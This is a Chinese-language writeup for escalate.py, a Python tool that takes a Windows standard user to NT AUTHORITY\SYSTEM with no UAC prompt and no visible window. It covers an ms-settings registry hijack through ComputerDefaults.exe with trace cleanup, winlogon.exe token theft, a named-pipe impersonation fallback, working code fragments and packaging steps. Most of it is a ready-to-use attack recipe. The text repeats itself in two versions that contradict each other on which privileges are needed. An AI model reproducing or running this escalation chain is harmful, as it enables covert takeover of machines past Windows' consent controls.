# USER → SYSTEM 無彈窗靜默提權 — 解題 Writeup

## 背景

Windows 的 UAC（User Account Control）機制將普通使用者與管理員帳號的執行環境隔離，
即使登入的是管理員帳號，預設也以標準權限運行，需要顯式授權才能提升。
更高一層的 **NT AUTHORITY\SYSTEM** 則是作業系統本身使用的帳號，
擁有比管理員更高的權限，能存取所有 Process、Token 與受保護的系統資源。

本工具的目標：**從普通使用者身份，全程不觸發任何 UAC 彈窗、不開啟任何可見視窗，直接提升至 SYSTEM**。

> **驗證結果（2026-05-08）**
> ```
> whoami        → nt authority\system
> SeTcbPrivilege       Enabled
> SeDebugPrivilege     Enabled
> SeImpersonatePrivilege Enabled
> ```

---

## 問題起點

傳統提權工具有以下痛點：

- `Start-Process -Verb RunAs` → 觸發明顯的 UAC 對話框
- 直接呼叫 `ShellExecute` + `runas` → 同上
- 現有工具（sl0puacb.cs + UAC.py + ps1 打包器）分成三支程式，依賴 PowerShell 編譯 C#，且仍需管理員手動啟動

需求：**單一 Python 程式、全自動、USER 到 SYSTEM、無視窗、無彈窗**。

---

## 提權鏈架構

```
python escalate.py  [USER, 有 console]
        │
        ▼  Stage 0：ms-settings COM Handler 劫持
        │  ShellExecuteW(ComputerDefaults.exe)  ← autoElevate=true
        │  立即退出，無任何輸出
        │
pythonw.exe escalate.py --stage1 <cwd>  [ADMIN, 無視窗]
        │
        ▼  Stage 1：winlogon.exe Token 竊取
        │  CreateProcessWithTokenW (flag=0, 無 profile 載入)
        │  （備援：Named Pipe 模擬）
        │
pythonw.exe escalate.py --stage2 <cwd>  [NT AUTHORITY\SYSTEM, 無視窗]
        │
        ▼  Stage 2：Payload 執行
           結果寫入 C:\Users\Public\esc_result.txt
```

> Stage 1 與 Stage 2 全部使用 `pythonw.exe`（無 console）+ `CREATE_NO_WINDOW`，
> 對使用者完全不可見。

---

## Stage 0：USER → ADMIN（無 UAC 彈窗）

### 原理：autoElevate 程式的 COM Handler 劫持

Windows 內建一批被標記為 `autoElevate=true` 的系統程式，
這些程式在白名單驗證後，**允許在不彈出 UAC 視窗的情況下自動取得管理員權限**。
`ComputerDefaults.exe`（控制台預設程式設定）是其中之一。

`ComputerDefaults.exe` 啟動時會透過 Shell 開啟 `ms-settings:` URI，
Windows 解析 URI Handler 時查找順序為：

```
HKCU\Software\Classes\ms-settings\  (使用者可寫入，優先)
HKLM\Software\Classes\ms-settings\  (系統預設，後查)
```

由於普通使用者對 `HKCU` 有完整寫入權限，可以在 `HKCU` 建立假的 Handler：

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
    (Default)       = "pythonw.exe" "escalate.py" --stage1 "C:\...\cwd"
    DelegateExecute = ""     ← 此值必須存在，空字串即可
```

`DelegateExecute` 的存在告訴 Shell 使用 **COM 代理執行**（而非直接 ShellExecute），
這是觸發劫持的關鍵。`ComputerDefaults.exe` 嘗試打開 `ms-settings:` 時，
Shell 改而執行我們設定的指令，且繼承 `ComputerDefaults.exe` 的**管理員身份**。

### 無視窗的關鍵：pythonw.exe

Stage 0 透過 `_self_cmd(windowless=True)` 建立指令，
將 interpreter 從 `python.exe` 換成 `pythonw.exe`：

```python
def _self_cmd(extra_args, windowless=False):
    interp = sys.executable
    if windowless and interp.lower().endswith("python.exe"):
        interp = interp[:-10] + "pythonw.exe"   # 切換為無 console 版本
    return f'"{interp}" "{script}" {extra_args}'
```

ComputerDefaults 觸發後，使用者**看不到任何 console 視窗**。

### 必須使用 ShellExecuteW，不能用 Popen

```python
# 正確：透過 Shell API，autoElevate 才能觸發
ctypes.windll.shell32.ShellExecuteW(
    None, "open", r"C:\Windows\System32\ComputerDefaults.exe", None, None, 0)

# 錯誤：Popen/CreateProcess 繞過 Shell，回傳 WinError 740 ERROR_ELEVATION_REQUIRED
subprocess.Popen(["ComputerDefaults.exe"])  # ← 會失敗
```

### 執行流程

```
1. 寫入 HKCU\...\ms-settings\Shell\Open\command（含 DelegateExecute=""）
2. ShellExecuteW(ComputerDefaults.exe, SW_HIDE)
3. 等待 3 秒（確保 registry 被讀取）
4. reg delete HKCU\Software\Classes\ms-settings /f（清理痕跡）
5. Stage 0 process 退出 — Stage 1 已在管理員身份下靜默執行
```

### 限制條件

| UAC 等級 | 是否有效 |
|----------|---------|
| 預設（中）：僅 Windows 程式不提示 | **有效** |
| 較高：所有程式均提示 | 無效 |
| 最高：永遠通知 | 無效 |

Windows 11 預設 UAC 等級下有效。

---

## Stage 1：ADMIN → NT AUTHORITY\SYSTEM（Token 竊取）

### 原理：winlogon.exe 的 Primary Token

`winlogon.exe` 是 Windows 登入管理程式，始終以 **NT AUTHORITY\SYSTEM** 身份運行。
管理員帳號啟用 `SeDebugPrivilege` 後，可以開啟任意 Process 的 Handle。

**Token 竊取鏈：**

```
1. AdjustTokenPrivileges → 啟用 SeDebugPrivilege           （必須成功）
                         → 啟用 SeIncreaseQuotaPrivilege    （必須成功）
                         → 啟用 SeAssignPrimaryTokenPrivilege（此 token 內不存在，忽略）

2. CreateToolhelp32Snapshot → 枚舉 Process，找 winlogon.exe PID

3. OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)

4. OpenProcessToken(TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY)
   → 取得 winlogon 的 Token Handle

5. DuplicateTokenEx(TOKEN_ALL_ACCESS, SecurityImpersonation, TokenPrimary)
   → 複製為 Primary Token（可用於啟動新 Process）

6. CreateProcessWithTokenW(token, flag=0, "pythonw.exe escalate.py --stage2 <cwd>")
   → 以 SYSTEM 身份啟動新程序
```

### ctypes 64 位元 Handle 截斷問題（已修正）

Windows 64 位元環境下，HANDLE 為 8 bytes，但 ctypes 預設回傳型別為 `c_int`（4 bytes）。
不設定 `restype`/`argtypes` 會導致 Handle 高 32 位元被截斷，呼叫失敗：

```python
# 所有 HANDLE 相關函式必須明確設定：
_kernel32.OpenProcess.restype  = ctypes.c_void_p   # ← 不設定 → 截斷 → ERROR_INVALID_HANDLE
_kernel32.OpenProcess.argtypes = [_DWORD, _BOOL, _DWORD]
```

### SeAssignPrimaryTokenPrivilege 不存在於此 Token

ComputerDefaults bypass 取得的管理員 token，`SeAssignPrimaryTokenPrivilege` 並不存在
（`AdjustTokenPrivileges` 回傳 `err=0x514 ERROR_NOT_ALL_ASSIGNED`）。
但實測 `CreateProcessWithTokenW(flag=0)` **仍然成功**——此 privilege 並非必要條件。

### 嘗試 CreateProcessAsUserW，回退至 CreateProcessWithTokenW

```python
# 優先嘗試（不載入 Profile，更輕量）
ok = _advapi32.CreateProcessAsUserW(token, None, cmd, ...)
# 若失敗（0x522 ERROR_PRIVILEGE_NOT_HELD）：
ok = _advapi32.CreateProcessWithTokenW(token, 0, None, cmd, ...)  # flag=0：不載入 Profile
```

`LOGON_WITH_PROFILE` flag 可能導致 SYSTEM profile 載入失敗，改用 `0` 避免此問題。

### 備援：Named Pipe 模擬（ImpersonateNamedPipeClient）

若 Token 竊取因環境限制失敗，啟用備援路徑：

```
1. CreateNamedPipe(\\.\pipe\sl0pr00t_esc)
2. 觸發系統服務連線（排程任務作為誘餌）
3. ConnectNamedPipe → ImpersonateNamedPipeClient
   → 取得連線客戶端的 Thread Token（若為 SYSTEM 服務即為 SYSTEM Token）
4. OpenThreadToken → DuplicateTokenEx → CreateProcessWithTokenW
5. RevertToSelf（清理 impersonation 狀態）
```

---

## Stage 2：Payload 執行

Stage 2 在 SYSTEM 身份下執行，沒有 console，所有輸出寫入檔案。

```python
def stage2_payload(cwd: str) -> None:
    os.chdir(cwd)            # 回到原始工作目錄
    identity = _current_user()
    # identity = "NT AUTHORITY\SYSTEM"

    whoami = subprocess.check_output(
        [r"C:\Windows\System32\whoami.exe"], ...)
    # → "nt authority\system"

    # 結果寫入 C:\Users\Public\esc_result.txt（所有身份均可寫入）
```

### 讀取結果

```powershell
python .\escalate.py; Start-Sleep 6; Get-Content C:\Users\Public\esc_result.txt
```

---

## 技術難點與解法

### 難點 1：工作目錄漂移

`ComputerDefaults.exe` 觸發的子程序工作目錄為 `C:\Windows\System32`，
後續每次 re-launch 同樣不繼承原始目錄。

**解法：** 每個 Stage 將原始 `cwd` 作為命令列參數傳遞：

```python
cmd = f'"{pythonw}" "{script}" --stage1 "{os.getcwd()}"'
# 接收端：
os.chdir(sys.argv[2])
```

### 難點 2：跨 Stage 的 Log 路徑

三個 Stage 的 `%TEMP%` 各不相同：
- Stage 0 (USER)：`C:\Users\<name>\AppData\Local\Temp`
- Stage 2 (SYSTEM)：`C:\Windows\Temp`

`C:\Users\Public` 所有身份均可讀寫，作為統一輸出路徑。

```python
for path in [os.environ.get("TEMP","")+"\\esc_log.txt",
             r"C:\Windows\Temp\esc_log.txt",
             r"C:\Users\Public\esc_log.txt",
             os.getcwd()+"\\esc_log.txt"]:
    try: open(path,"a").write(line); return
    except: continue
```

### 難點 3：Stage 2 subprocess 的 local variable 衝突

```python
# 錯誤：在函式內部 import subprocess 會使整個函式作用域的 subprocess 變為 local
# → 在 import 之前用到 subprocess → UnboundLocalError
if not _written:
    import subprocess   # ← 千萬不要這樣寫
    subprocess.run(...)

# 正確：在模組頂層 import
import subprocess
```

### 難點 4：PyInstaller --noconsole 相容性

`_self_cmd()` 在 frozen / 非 frozen 兩種環境自動切換：

```python
if getattr(sys, "frozen", False):
    return f'"{sys.executable}" {extra_args}'           # .exe
else:
    return f'"{interp}" "{script}" {extra_args}'        # pythonw.exe + .py
```

---

## 各 Stage 的身份狀態

| Stage | 參數 | 執行身份 | 視窗 | 關鍵 API |
|-------|------|---------|------|---------|
| 0 | （無） | 標準使用者 | 有（呼叫端） | `ShellExecuteW`、`CreateKey` |
| 1 | `--stage1 <cwd>` | 管理員 | 無（pythonw） | `DuplicateTokenEx`、`CreateProcessWithTokenW` |
| 1b | （備援） | 管理員 | 無 | `ImpersonateNamedPipeClient` |
| 2 | `--stage2 <cwd>` | NT AUTHORITY\SYSTEM | 無（pythonw） | 任意 |

---

## 實作架構（escalate.py）

```
escalate.py
├── _is_admin()                              # 檢查目前是否為管理員
├── _self_cmd(extra_args, windowless=False)  # 建立重啟自身的指令
│                                            # windowless=True → pythonw.exe
├── stage0_uac_bypass()                      # USER -> ADMIN
│   ├─ 寫入 HKCU ms-settings handler
│   ├─ ShellExecuteW(ComputerDefaults.exe, SW_HIDE)
│   └─ 清理 registry
│
├── stage1_get_system(cwd)                   # ADMIN -> SYSTEM
│   ├─ _enable_privilege() × 3
│   ├─ _find_pid("winlogon.exe")
│   ├─ _steal_system_token()                 # 主要路徑
│   ├─ _spawn_as_system(token, cwd)          # CreateProcessAsUserW → CreateProcessWithTokenW
│   └─ _namedpipe_fallback(cwd)              # 備援路徑
│
├── stage2_payload(cwd)                      # SYSTEM
│   ├─ 寫入 C:\Users\Public\esc_s2.txt（存活標記）
│   ├─ whoami / whoami /priv
│   └─ 結果寫入 C:\Users\Public\esc_result.txt
│
├── _log(msg)                                # 跨 stage 日誌（多路徑 fallback）
└── main()
    ├─ "--stage1" → stage1_get_system()
    ├─ "--stage2" → stage2_payload()
    ├─ "--payload-only" → stage2_payload()   （偵錯：跳過提權直接跑 payload）
    ├─ 非 admin → stage0_uac_bypass()
    └─ 已是 admin → stage1_get_system()
```

---

## 打包指令

```powershell
pyinstaller --onefile --noconsole escalate.py
```

錯誤輸出（noconsole 模式）會寫入 `%TEMP%\esc_err.txt`。

---

## 參考資料

- [UACME — UAC bypass techniques collection](https://github.com/hfiref0x/UACME) — ms-settings hijack（Technique #33）
- [James Forshaw — Windows Token Duplication](https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html)
- [Windows Internals — Token Stealing](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Win32 API：`DuplicateTokenEx`、`CreateProcessWithTokenW`、`CreateProcessAsUserW`、`ImpersonateNamedPipeClient`
- [sl0puacb.cs](sl0puacb.cs) — 原始 C# Token 竊取實作
- [UAC.py](UAC.py) — 原始 Python UAC bypass 實作


## 背景

Windows 的 UAC（User Account Control）機制將普通使用者與管理員帳號的執行環境隔離，
即使登入的是管理員帳號，預設也以標準權限運行，需要顯式授權才能提升。
更高一層的 **NT AUTHORITY\SYSTEM** 則是作業系統本身使用的帳號，
擁有比管理員更高的權限，能存取所有 Process、Token 與受保護的系統資源。

本工具的目標：**從普通使用者身份，全程不觸發任何 UAC 彈窗，直接提升至 SYSTEM**。

---

## 問題起點

傳統提權工具有以下痛點：

- `Start-Process -Verb RunAs` → 觸發明顯的 UAC 對話框
- 直接呼叫 `ShellExecute` + `runas` → 同上
- 現有工具（sl0puacb.cs + UAC.py + ps1 打包器）分成三支程式，依賴 PowerShell 編譯 C#，且仍需管理員手動啟動

需求：**單一 Python 程式、全自動、USER 到 SYSTEM、無視窗、無彈窗**。

---

## 提權鏈架構

```
escalate.py  [USER]
        │
        ▼  Stage 0：ms-settings COM Handler 劫持
        │  ComputerDefaults.exe（autoElevate）
        │
escalate.py  [ADMIN]  ← --stage1 "<cwd>"
        │
        ▼  Stage 1：winlogon.exe Token 竊取
        │  CreateProcessWithTokenW
        │  （備援：Named Pipe 模擬）
        │
escalate.py  [NT AUTHORITY\SYSTEM]  ← --stage2 "<cwd>"
        │
        ▼  Stage 2：Payload 執行
```

---

## Stage 0：USER → ADMIN（無 UAC 彈窗）

### 原理：autoElevate 程式的 COM Handler 劫持

Windows 內建一批被標記為 `autoElevate=true` 的系統程式，
這些程式在以白名單機制驗證後，**允許在不彈出 UAC 視窗的情況下自動取得管理員權限**。
`ComputerDefaults.exe`（控制台預設程式設定）是其中之一。

`ComputerDefaults.exe` 啟動時會透過 Shell 開啟 `ms-settings:` URI，
Windows 解析 URI Handler 時查找順序為：

```
HKCU\Software\Classes\ms-settings\  (使用者可寫入，優先)
HKLM\Software\Classes\ms-settings\  (系統預設，後查)
```

由於普通使用者對 `HKCU` 有完整寫入權限，我們可以在 `HKCU` 建立假的 Handler：

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
    (Default)       = "escalate.exe" --stage1 "C:\...\cwd"
    DelegateExecute = ""     ← 此值必須存在，空字串即可
```

`DelegateExecute` 的存在告訴 Shell 使用 **COM 代理執行**（而非直接 ShellExecute），
這是觸發劫持的關鍵。當 `ComputerDefaults.exe` 嘗試打開 `ms-settings:` 時，
Shell 改而執行我們設定的指令，且繼承 `ComputerDefaults.exe` 的**管理員身份**。

### 執行流程

```
1. 寫入 HKCU\...\ms-settings\Shell\Open\command
2. 啟動 ComputerDefaults.exe（CREATE_NO_WINDOW，無視窗）
3. 等待 3 秒（確保 ComputerDefaults 讀取 registry）
4. 清理：reg delete HKCU\Software\Classes\ms-settings /f
5. 提權後的 escalate.exe --stage1 "<cwd>" 已在管理員身份下執行
```

### 限制條件

| UAC 等級 | 是否有效 |
|----------|---------|
| 預設（中）：僅 Windows 程式不提示 | **有效** |
| 較高：所有程式均提示 | 無效 |
| 最高：永遠通知 | 無效 |

Windows 11 預設 UAC 等級下有效。

---

## Stage 1：ADMIN → NT AUTHORITY\SYSTEM（Token 竊取）

### 原理：winlogon.exe 的 Primary Token

`winlogon.exe` 是 Windows 登入管理程式，始終以 **NT AUTHORITY\SYSTEM** 身份運行。
管理員帳號啟用 `SeDebugPrivilege` 後，可以開啟任意 Process 的 Handle。

**Token 竊取鏈：**

```
1. AdjustTokenPrivileges → 啟用 SeDebugPrivilege
                         → 啟用 SeAssignPrimaryTokenPrivilege
                         → 啟用 SeIncreaseQuotaPrivilege

2. CreateToolhelp32Snapshot → 枚舉 Process，找 winlogon.exe PID

3. OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)

4. OpenProcessToken(TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY)
   → 取得 winlogon 的 Token Handle

5. DuplicateTokenEx(TOKEN_ALL_ACCESS, SecurityImpersonation, TokenPrimary)
   → 複製為 Primary Token（可用於啟動新 Process）

6. CreateProcessWithTokenW(duplicated_token, "escalate.exe --stage2 <cwd>")
   → 以 SYSTEM 身份啟動新程序
```

### 備援：Named Pipe 模擬（ImpersonateNamedPipeClient）

若 Token 竊取因環境限制失敗，啟用備援路徑：

```
1. CreateNamedPipe(\\.\pipe\sl0pr00t_esc)
2. 觸發系統服務連線（排程任務作為誘餌）
3. ConnectNamedPipe → ImpersonateNamedPipeClient
   → 取得連線客戶端的 Thread Token（若為 SYSTEM 服務即為 SYSTEM Token）
4. OpenThreadToken → DuplicateTokenEx → CreateProcessWithTokenW
5. RevertToSelf（清理 impersonation 狀態）
```

---

## Stage 2：Payload 執行

```python
def stage2_payload(cwd: str) -> None:
    os.chdir(cwd)        # 回到原始工作目錄
    identity = _current_user()
    # → 此處 identity 為 "NT AUTHORITY\SYSTEM"
    # → 放入實際 payload 邏輯
```

---

## 技術難點與解法

### 難點 1：工作目錄漂移

`ComputerDefaults.exe` 觸發的子程序工作目錄預設為 `C:\Windows\System32`，
後續每次 re-launch 同樣不繼承原始目錄。

**解法：** 每個 stage 將原始 `cwd` 作為命令列參數傳遞，啟動後立即 `os.chdir()`：

```python
cmd = f'"{sys.executable}" --stage1 "{os.getcwd()}"'
# 接收端：
os.chdir(sys.argv[2])
```

### 難點 2：PyInstaller --noconsole 相容性

打包後 `sys.executable` 是 `.exe`，不是 `python.exe`；
`--noconsole` 模式下不能使用 `cmd.exe /k` 作載體（會彈出黑色視窗）。

**解法：** 直接重啟自身，frozen/非 frozen 自動偵測：

```python
def _self_cmd(extra_args):
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}" {extra_args}'
    else:
        return f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}" {extra_args}'
```

### 難點 3：CreateProcessWithTokenW 需要 Desktop 存取

在 Session 0 / 無桌面環境下啟動 Process，需明確指定 Desktop：

```python
si.lpDesktop = "winsta0\\default"
```

否則 `CreateProcessWithTokenW` 回傳 `ERROR_ACCESS_DENIED`。

### 難點 4：三個 Privilege 缺一不可

Token 複製與注入需同時啟用三個 Privilege：

| Privilege | 用途 |
|-----------|------|
| `SeDebugPrivilege` | 開啟 winlogon.exe Handle |
| `SeAssignPrimaryTokenPrivilege` | `CreateProcessWithTokenW` |
| `SeIncreaseQuotaPrivilege` | 調整新 Process 的 Quota |

缺少任何一個都會讓 `CreateProcessWithTokenW` 靜默失敗。

---

## 各 Stage 的身份狀態

| Stage | 參數 | 執行身份 | 關鍵 API |
|-------|------|---------|---------|
| 0 | （無） | 標準使用者 | `CreateKey`、`Popen(ComputerDefaults)` |
| 1 | `--stage1 <cwd>` | 管理員 | `DuplicateTokenEx`、`CreateProcessWithTokenW` |
| 1b | （備援） | 管理員 | `ImpersonateNamedPipeClient` |
| 2 | `--stage2 <cwd>` | NT AUTHORITY\SYSTEM | 任意 |

---

## 實作架構（escalate.py）

```
escalate.py
├── _is_admin()                        # 檢查目前是否為管理員
├── _self_cmd(extra_args)              # 建立重啟自身的指令（frozen 相容）
│
├── stage0_uac_bypass()                # USER -> ADMIN
│   ├─ 寫入 HKCU ms-settings handler
│   ├─ 啟動 ComputerDefaults.exe
│   └─ 清理 registry
│
├── stage1_get_system(cwd)             # ADMIN -> SYSTEM
│   ├─ _enable_privilege() × 3
│   ├─ _find_pid("winlogon.exe")
│   ├─ _steal_system_token()           # 主要路徑
│   ├─ _spawn_as_system(token, cwd)
│   └─ _namedpipe_fallback(cwd)        # 備援路徑
│
├── stage2_payload(cwd)                # SYSTEM
│   └─ [放入 payload 邏輯]
│
└── main()
    ├─ "--stage1" → stage1_get_system()
    ├─ "--stage2" → stage2_payload()
    ├─ "--payload-only" → stage2_payload()（偵錯用）
    ├─ 非 admin → stage0_uac_bypass()
    └─ 已是 admin → stage1_get_system()
```

---

## 打包指令

```
pyinstaller --onefile --noconsole escalate.py
```

錯誤輸出（noconsole 模式）會寫入 `%TEMP%\esc_err.txt`。

---

## 參考資料

- [UACME — UAC bypass techniques collection](https://github.com/hfiref0x/UACME) — ms-settings hijack（Technique #33）
- [James Forshaw — Windows Token Duplication](https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html)
- [Windows Internals — Token Stealing](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Win32 API：`DuplicateTokenEx`、`CreateProcessWithTokenW`、`ImpersonateNamedPipeClient`
- [sl0puacb.cs](sl0puacb.cs) — 原始 C# Token 竊取實作
- [UAC.py](UAC.py) — 原始 Python UAC bypass 實作
